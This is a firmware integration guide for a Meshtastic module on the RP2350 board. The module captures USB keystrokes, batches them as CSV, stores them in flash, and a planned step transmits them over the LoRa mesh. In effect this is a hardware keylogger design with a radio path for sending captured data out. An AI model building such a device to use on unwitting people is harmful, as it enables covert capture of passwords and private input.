# Meshtastic Firmware Integration Guide

## Overview

This guide shows how to integrate the Meshstatic module into the Meshtastic firmware for **rpipico2 variant only**.

---

## Prerequisites

The following files must be copied to the firmware:

```
Source: ~/Desktop/ste/MeshstaticModule/
Target: /Users/rstown/Desktop/ste/firmware/src/modules/

Files to copy:
├── MeshstaticModule.h          # Meshtastic module wrapper
├── MeshstaticModule.cpp        # Meshtastic module implementation
├── meshstatic_core1.h          # Core 1 controller API
├── meshstatic_core1.c          # Core 1 controller implementation
├── meshstatic_storage.h        # Storage manager API
├── meshstatic_storage.c        # Storage manager (needs LittleFS port)
├── meshstatic_batch.h          # Batch manager API
└── meshstatic_batch.c          # Batch manager implementation
```

---

## Step 1: Copy Module Files

```bash
# Copy all module files to firmware
cp ~/Desktop/ste/MeshstaticModule/Meshstatic*.{h,cpp} \
   /Users/rstown/Desktop/ste/firmware/src/modules/

cp ~/Desktop/ste/MeshstaticModule/meshstatic_*.{h,c} \
   /Users/rstown/Desktop/ste/firmware/src/modules/
```

---

## Step 2: Update Modules.cpp

### Add Include (with conditional compilation)

Add to `/Users/rstown/Desktop/ste/firmware/src/modules/Modules.cpp` after other includes:

```cpp
// Meshstatic module (RP2350 rpipico2 variant only)
#if defined(ARCH_RP2040) && defined(HW_VARIANT_RPIPICO2)
#include "modules/MeshstaticModule.h"
#endif
```

### Add Module Instantiation

Add to `setupModules()` function in `Modules.cpp` (before routingModule):

```cpp
void setupModules()
{
    // ... existing module setup code ...

#if defined(ARCH_RP2040) && defined(HW_VARIANT_RPIPICO2)
    // Meshstatic module for keystroke capture and storage (rpipico2 only)
    meshstaticModule = new MeshstaticModule();
    LOG_INFO("MeshstaticModule enabled for rpipico2 variant");
#endif

    // NOTE! This module must be added LAST because it likes to check for replies from other modules and avoid sending extra
    // acks
    routingModule = new RoutingModule();
}
```

---

## Step 3: Adapt Storage Layer for LittleFS

The current `meshstatic_storage.c` uses POSIX file operations (stdio.h). For RP2350, replace with LittleFS:

### Changes Required in `meshstatic_storage.c`

```c
// Replace POSIX includes:
// #include <stdio.h>
// #include <dirent.h>
// #include <sys/stat.h>

// With LittleFS:
#ifdef ARCH_RP2040
#include <LittleFS.h>

// Replace fopen/fwrite/fclose with:
// File file = LittleFS.open(path, "w");
// file.write(data, length);
// file.close();

// Replace opendir/readdir with:
// File root = LittleFS.open("/meshstatic");
// File entry = root.openNextFile();
// while (entry) { ... }
#else
// Keep POSIX for desktop testing
#include <stdio.h>
#include <dirent.h>
#endif
```

---

## Step 4: Configure Build System

### platformio.ini (if using PlatformIO)

Add to rpipico2 environment:

```ini
[env:rpipico2]
platform = raspberrypi
board = rpipico2
framework = arduino

# Enable LittleFS
build_flags =
    -D HW_VARIANT_RPIPICO2
    -D USE_LITTLEFS
    ; ... other flags ...

lib_deps =
    ; ... existing deps ...
    LittleFS  ; File system support
```

---

## Step 5: USB Capture Integration (Future)

When ready to connect to actual USB capture, modify `processKeystrokes()` in `MeshstaticModule.cpp`:

```cpp
#include "USBCapture.h"  // Your existing USB capture class

extern USBCapture* usbCapture;  // Global USB capture instance

uint32_t MeshstaticModule::processKeystrokes()
{
    uint32_t processed = 0;

    // Check if USB capture available
    if (usbCapture && usbCapture->available()) {
        keystroke_event_t event;

        // Dequeue all available keystrokes
        while (usbCapture->getKeystroke(&event)) {
            // Add to meshstatic batch
            bool added = meshstatic_core1_add_keystroke(
                event.scancode,
                event.modifier,
                event.character,
                event.capture_timestamp_us
            );

            if (added) {
                processed++;
                last_keystroke_us = event.capture_timestamp_us;
            }
        }
    }

    return processed;
}
```

---

## Module Behavior

### Initialization (First runOnce())

```
[INFO] MeshstaticModule first run - initializing...
[INFO] Initializing MeshstaticModule...
[MESHSTATIC] Storage initialized (recovered 0 batches)
[MESHSTATIC] Core 1 controller initialized (batch ID: 1)
[INFO] ✓ Meshstatic module initialized successfully
[INFO]   CSV batch format: 200-byte limit
[INFO]   Storage: LittleFS (/meshstatic/)
[INFO]   Auto-flush: 10 seconds idle timeout
[INFO]   Max keystrokes per batch: ~4
```

### Periodic Execution (Every 100ms)

```
[Loop iteration]
→ Process keystrokes from USB queue
→ Check auto-flush timeout (10 seconds idle)
→ Update statistics
→ Print stats every 60 seconds
```

### Batch Flushing

Automatic flush when:
- Batch reaches 200-byte limit (~4 keystrokes)
- 10 seconds idle (no keystrokes captured)

```
[MESHSTATIC] Batch 1 full - auto-flushing
[MESHSTATIC] Batch 1 saved to flash (4 keystrokes, 107 bytes)
```

### Statistics Logging (Every 60 seconds)

```
[INFO] Meshstatic Stats: captured=42, batches=10, errors=0
[INFO]   Storage: 10 batches, 1070 bytes, oldest=1, newest=10
```

---

## Board Variant Detection

The module only compiles and runs on **rpipico2** variant:

```cpp
#if defined(ARCH_RP2040) && defined(HW_VARIANT_RPIPICO2)
// Meshstatic code here
#endif
```

This ensures:
- ✅ Module active on RP2350 (rpipico2)
- ✅ Module inactive on all other boards (ESP32, NRF52, etc.)
- ✅ No code bloat on unsupported platforms

---

## File Locations After Integration

```
/Users/rstown/Desktop/ste/firmware/src/modules/
├── MeshstaticModule.h              # OSThread wrapper
├── MeshstaticModule.cpp            # Module implementation
├── meshstatic_core1.h              # Core 1 controller
├── meshstatic_core1.c              # Controller implementation
├── meshstatic_storage.h            # Storage API
├── meshstatic_storage.c            # Storage implementation (needs LittleFS port)
├── meshstatic_batch.h              # Batch manager
└── meshstatic_batch.c              # Batch implementation
```

---

## Testing After Integration

### Build Test

```bash
cd /Users/rstown/Desktop/ste/firmware
pio run -e rpipico2
```

Expected output:
```
Building for rpipico2...
Compiling .pio/build/rpipico2/src/modules/MeshstaticModule.cpp.o
Compiling .pio/build/rpipico2/src/modules/meshstatic_core1.c.o
Compiling .pio/build/rpipico2/src/modules/meshstatic_storage.c.o
Compiling .pio/build/rpipico2/src/modules/meshstatic_batch.c.o
...
✓ Build successful
```

### Runtime Test

Flash to rpipico2 and check serial output:

```
[INFO] MeshstaticModule constructor called (rpipico2 variant)
[INFO] MeshstaticModule first run - initializing...
[INFO] ✓ Meshstatic module initialized successfully
```

---

## Module Lifecycle

```
Meshtastic Boot
    ↓
setupModules()
    ↓
new MeshstaticModule()  (rpipico2 only)
    ↓
OSThread scheduler starts
    ↓
runOnce() - First run (initialize)
    ↓
runOnce() - Every 100ms (process keystrokes)
    ↓
    [Capture → Batch → Flush → Storage]
    ↓
Shutdown
    ↓
meshstatic_core1_shutdown() (flush remaining data)
```

---

## Configuration Options (Future)

Add to module config protobuf (optional):

```protobuf
message ModuleConfig {
    // ... existing module configs ...

    message MeshstaticConfig {
        bool enabled = 1;
        uint32_t batch_size_limit = 2;  // Default: 200 bytes
        uint32_t auto_flush_timeout_s = 3;  // Default: 10 seconds
        uint32_t max_batches = 4;  // Default: 100 batches
    }

    MeshstaticConfig meshstatic = XX;
}
```

---

## Memory Usage

| Component | RAM | Flash |
|-----------|-----|-------|
| Module instance | ~100 bytes | - |
| Batch buffer | 252 bytes | - |
| Storage metadata | ~50 bytes | - |
| **Total RAM** | **~400 bytes** | - |
| **Flash Storage** | - | ~20 KB (100 batches) |

---

## Troubleshooting

### Module Not Starting

**Symptom**: No log output from MeshstaticModule

**Check**:
1. Verify board variant: `#define HW_VARIANT_RPIPICO2` in variant.h
2. Check Modules.cpp has conditional compilation block
3. Verify module allocated in setupModules()

### Storage Errors

**Symptom**: `save_errors` count increasing

**Check**:
1. LittleFS initialized correctly
2. Flash storage not full
3. Directory `/meshstatic/` created

### No Keystrokes Captured

**Symptom**: `keystrokes_captured` stays at 0

**Check**:
1. USB capture system running
2. processKeystrokes() integration complete
3. USB queue not empty

---

## Next Steps (Component 4 - Future)

### Transmission Module

For transmitting batch files via LoRa/mesh:

```cpp
// In MeshstaticModule::runOnce()
// Check for batches ready to transmit
uint32_t batch_id = meshstatic_storage_get_next_to_transmit();

if (batch_id > 0) {
    // Export CSV
    uint32_t length;
    char* csv = meshstatic_storage_export_batch(batch_id, &length);

    if (csv) {
        // Send via Meshtastic mesh
        // meshtastic_MeshPacket *packet = allocDataPacket();
        // memcpy(packet->decoded.payload.bytes, csv, length);
        // service->sendToMesh(packet);

        free(csv);
    }
}
```

---

## Quick Reference

| Action | Code |
|--------|------|
| **Initialize** | `meshstatic_core1_init()` |
| **Add Keystroke** | `meshstatic_core1_add_keystroke(...)` |
| **Flush Batch** | `meshstatic_core1_flush_batch()` |
| **Get Stats** | `meshstatic_core1_get_stats(...)` |
| **Export Batch** | `meshstatic_storage_export_batch(...)` |
| **Delete Batch** | `meshstatic_storage_delete_batch(...)` |

---

## License

BSD-3-Clause
